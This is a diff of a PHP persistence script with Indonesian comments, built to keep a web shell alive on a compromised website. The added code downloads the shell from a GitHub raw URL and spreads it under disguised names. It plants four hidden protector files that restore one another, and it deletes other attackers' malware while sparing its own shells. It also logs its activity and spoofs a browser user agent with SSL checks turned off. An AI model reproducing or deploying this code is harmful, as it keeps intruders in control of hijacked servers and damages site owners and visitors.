@@ -1,20 +1,80 @@
 <?php
 // =============================================
-// PROTECTOR GANAS - VERSI UPGRADE
-// 4 file saling jaga + auto restore shell
+// PROTECTOR FINAL GANAS 2026 - Versi Spread + Log
+// Shell lo akan nyebar kalau dihapus
 // =============================================
 
-$shell_name = 'version.php';   // GANTI ini jadi nama shell lo (contoh: .aw.php)
-$shell_url  = 'https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/aw.txt';
+$shell_names = ['version.php', '.version.php', 'cache.php', 'update.php'];  // Shell akan nyebar ke nama-nama ini
+$shell_url   = 'https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/aw.txt';
 
-$protectors = [
-    '.syscache.php',
-    '.update.php',
-    '.controller.php',
-    '.configcache.php'
-];
+$protectors = ['.syscache.php', '.update.php', '.controller.php', '.configcache.php'];
 
-// Pola malware (tetap ganas)
+$log_file = $_SERVER['DOCUMENT_ROOT'] . '/.update-log.txt';
+
+function write_log($msg) {
+    global $log_file;
+    $time = date('Y-m-d H:i:s');
+    @file_put_contents($log_file, "[$time] $msg\n", FILE_APPEND | LOCK_EX);
+}
+
+// Download shell lebih tahan Cloudflare
+function download_shell($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 40);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36');
+        $data = curl_exec($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        if ($code == 200 && strlen($data) > 50000) return $data;
+    }
+    if (ini_get('allow_url_fopen')) {
+        $data = @file_get_contents($url);
+        if ($data && strlen($data) > 50000) return $data;
+    }
+    return false;
+}
+
+$docroot = $_SERVER['DOCUMENT_ROOT'];
+
+// 1. Restore & Spread Shell (menyebar ke beberapa nama)
+$restored = false;
+foreach ($shell_names as $name) {
+    $path = $docroot . '/' . $name;
+    if (!file_exists($path) || filesize($path) < 50000) {
+        $code = download_shell($shell_url);
+        if ($code) {
+            file_put_contents($path, $code);
+            @chmod($path, 0644);
+            write_log("Shell restored & spread to: $name");
+            $restored = true;
+        }
+    }
+}
+if ($restored) {
+    echo "<pre>✅ Shell lo telah di-restore dan disebar ke beberapa nama!</pre>";
+}
+
+// 2. Saling restore antar 4 protector
+foreach ($protectors as $p) {
+    $path = $docroot . '/' . $p;
+    if (!file_exists($path)) {
+        foreach ($protectors as $source) {
+            $src = $docroot . '/' . $source;
+            if (file_exists($src)) {
+                copy($src, $path);
+                @chmod($path, 0644);
+                write_log("Protector restored: $p");
+                break;
+            }
+        }
+    }
+}
+
+// 3. Anti-malware (skip semua shell lo)
 $malware_patterns = [
     'eval\s*\(\s*(base64_decode|str_rot13|gzinflate)',
     'base64_decode|str_rot13|gzinflate|assert',
@@ -23,52 +83,26 @@ $malware_patterns = [
     'GIF89a.*<\?php|<\?php.*GIF89a',
 ];
 
-$docroot = $_SERVER['DOCUMENT_ROOT'];
-
-// 1. Restore shell lo
-$shell_path = $docroot . '/' . $shell_name;
-if (!file_exists($shell_path) || filesize($shell_path) < 10000) {
-    $code = @file_get_contents($shell_url);
-    if ($code) {
-        file_put_contents($shell_path, $code);
-        @chmod($shell_path, 0644);
-    }
-}
-
-// 2. Saling restore antar 4 protector
-foreach ($protectors as $p) {
-    $path = $docroot . '/' . $p;
-    if (!file_exists($path)) {
-        // Copy dari file pertama yang ada
-        foreach ($protectors as $source) {
-            $src_path = $docroot . '/' . $source;
-            if (file_exists($src_path)) {
-                copy($src_path, $path);
-                @chmod($path, 0644);
-                break;
-            }
-        }
-    }
-}
-
-// 3. Anti-malware delete langsung
 function kill_malware($dir) {
-    global $malware_patterns;
+    global $malware_patterns, $shell_names;
     $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
     $deleted = 0;
     foreach ($iterator as $file) {
-        if ($file->isFile()) {
-            $path = $file->getPathname();
-            $ext = strtolower($file->getExtension());
-            if (!in_array($ext, ['php','phtml','php5','inc','gif','jpg'])) continue;
+        if (!$file->isFile()) continue;
+        $filename = basename($file->getPathname());
+        if (in_array($filename, $shell_names)) continue;  // SKIP semua shell lo
 
-            $content = @file_get_contents($path);
-            foreach ($malware_patterns as $pat) {
-                if (preg_match('#' . $pat . '#i', $content)) {
-                    @unlink($path);
-                    $deleted++;
-                    break;
-                }
+        $path = $file->getPathname();
+        $ext = strtolower($file->getExtension());
+        if (!in_array($ext, ['php','phtml','php5','inc','gif','jpg','png'])) continue;
+
+        $content = @file_get_contents($path);
+        foreach ($malware_patterns as $pat) {
+            if (preg_match('#' . $pat . '#i', $content)) {
+                @unlink($path);
+                $deleted++;
+                write_log("Malware deleted: $path");
+                break;
             }
         }
     }
@@ -77,8 +111,10 @@ function kill_malware($dir) {
 
 $malware_killed = kill_malware($docroot);
 
-echo "<!-- PROTECTOR GANAS AKTIF - 4 layer saling jaga -->\n";
+echo "<!-- PROTECTOR FINAL AKTIF - Shell nyebar otomatis -->\n";
 if ($malware_killed > 0) {
-    echo "<pre>✅ $malware_killed malware attacker dihapus!</pre>";
+    echo "<pre>✅ $malware_killed malware attacker dihapus</pre>";
 }
+
+write_log("Protector run - Malware killed: $malware_killed");
 ?>
